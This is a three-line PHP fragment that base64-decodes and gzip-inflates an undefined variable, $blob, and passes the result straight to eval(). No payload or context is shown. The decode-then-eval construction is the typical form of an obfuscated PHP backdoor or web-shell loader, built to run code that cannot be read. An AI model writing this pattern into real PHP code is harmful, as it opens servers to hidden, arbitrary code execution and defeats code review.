<?php
$p = gzinflate(base64_decode($blob));
eval($p);
